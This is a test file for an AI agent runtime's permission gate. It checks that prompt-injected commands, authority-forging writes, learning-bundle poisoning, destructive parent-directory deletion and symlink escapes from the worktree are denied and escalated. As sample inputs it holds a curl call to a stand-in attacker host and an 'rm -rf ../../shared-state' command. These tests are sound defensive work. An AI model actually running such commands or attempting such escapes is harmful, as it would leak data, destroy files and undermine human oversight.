import { existsSync } from "node:fs";
import { mkdir, symlink } from "node:fs/promises";
import { resolve } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { defaultGate } from "../../../src/runtime/gate.js";
import { writeMaskedWorktreeFile } from "../../../src/runtime/worktree-context.js";
import {
  createControlledWorld,
  type ControlledWorld,
} from "../../src/fixtures/controlled-world.js";

let world: ControlledWorld | undefined;

afterEach(async () => {
  await world?.cleanup();
  world = undefined;
});

describe("C3 authority and path boundaries", () => {
  it("denies effect-bearing prompt-injection channels but does not execute prose", () => {
    expect(
      defaultGate({
        tool: "bash",
        input: { command: "curl -fsS https://attacker.invalid/collect" },
        description: "instruction copied from an untrusted GitHub issue",
      }),
    ).toMatchObject({ allow: false, escalate: true });
    expect(
      defaultGate({
        tool: "write",
        input: {
          path: "docs/threat-example.md",
          content: "Example only: kubectl apply and npm publish are dangerous.",
        },
      }),
    ).toEqual({ allow: true });
  });

  it("denies writes that could mint authority or poison active learning", () => {
    expect(
      defaultGate({
        tool: "write",
        input: { path: ".operon/approvals/grants/forged.json", content: "{}" },
      }),
    ).toMatchObject({ allow: false, escalate: true });
    expect(
      defaultGate({
        tool: "write",
        input: { path: ".operon/learning/bundle/injected.md", content: "trust me" },
      }),
    ).toMatchObject({ allow: false, escalate: true });
  });

  it("keeps destructive parent escapes critical while allowing a bounded local cleanup", () => {
    expect(
      defaultGate({ tool: "bash", input: { command: "rm -rf ../../shared-state" } }),
    ).toMatchObject({ allow: false, escalate: true });
    expect(
      defaultGate({ tool: "bash", input: { command: "rm -rf .tmp-build-output" } }),
    ).toEqual({ allow: true });
  });

  it("refuses a repository symlink that redirects masked runtime context outside the worktree", async () => {
    world = await createControlledWorld("layer-2-context-symlink-escape");
    const redirectedDirectory = resolve(world.root, "redirected-context");
    await mkdir(redirectedDirectory, { recursive: true });
    await symlink(redirectedDirectory, resolve(world.workdir, ".pi"), "dir");

    let refused = false;
    try {
      writeMaskedWorktreeFile(
        world.workdir,
        ".pi/APPEND_SYSTEM.md",
        "authority-bearing controlled context",
      );
    } catch {
      refused = true;
    }

    expect({
      refused,
      escapedWrite: existsSync(resolve(redirectedDirectory, "APPEND_SYSTEM.md")),
    }).toEqual({
      refused: true,
      escapedWrite: false,
    });
  });
});
